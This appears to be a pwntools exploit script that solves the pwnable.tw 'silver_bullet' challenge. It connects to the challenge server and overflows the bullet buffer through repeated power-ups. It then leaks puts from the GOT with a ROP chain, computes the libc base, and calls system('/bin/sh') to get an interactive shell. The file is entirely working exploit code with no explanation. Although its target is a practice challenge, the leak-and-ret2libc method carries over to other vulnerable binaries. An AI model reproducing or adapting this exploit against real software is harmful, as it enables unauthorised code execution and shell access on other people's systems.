from pwn import *

# r = process('./silver_bullet', env={"LD_PRELOAD":"libc_32.so.6"})
r = remote('chall.pwnable.tw', 10103)
libc = ELF('./libc_32.so.6')
elf = ELF('./silver_bullet')

binsh_offset = next(libc.search('/bin/sh\x00'))
system_offset = libc.symbols['system']
puts_offset = libc.symbols['puts']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = 0x08048954
def create_bullet(data):
    r.sendlineafter("choice :", str(1))
    r.sendafter("bullet :", data)

def power_up(data):
    r.sendlineafter("choice :", str(2))
    r.sendafter("bullet :", data)

def beat():
    r.sendlineafter("choice :", str(3))

def overflow1(payload):
    create_bullet("1")
    power_up("*"*0x2e)
    power_up("*")
    power_up(payload)
    beat()
    beat()
    beat()
    beat()

def overflow2(payload):
    r.sendline("1")
    r.sendlineafter("bullet :", str(1))
    power_up("*"*0x2e)
    power_up("*")
    power_up(payload)
    beat()
    beat()
    beat()
    beat()

def solve():
    payload = '*'*3 + '*'*4 + p32(puts_plt) + p32(main) + p32(puts_got)
    overflow1(payload)
    r.recvuntil("Oh ! You win !!\n")

    puts_addr = u32( r.recv(4))

    libc_base = puts_addr - puts_offset
    system = libc_base + system_offset
    binsh = libc_base + binsh_offset
    log.info("leak puts addr: %s"%hex(puts_addr))
    log.info("leak libc addr: %s"%hex(libc_base))

    payload = '*'*3 + '*'*4 + p32(system) + 'A'*4 + p32(binsh)
    overflow2(payload)
    r.interactive() 
if __name__ == '__main__':
    solve()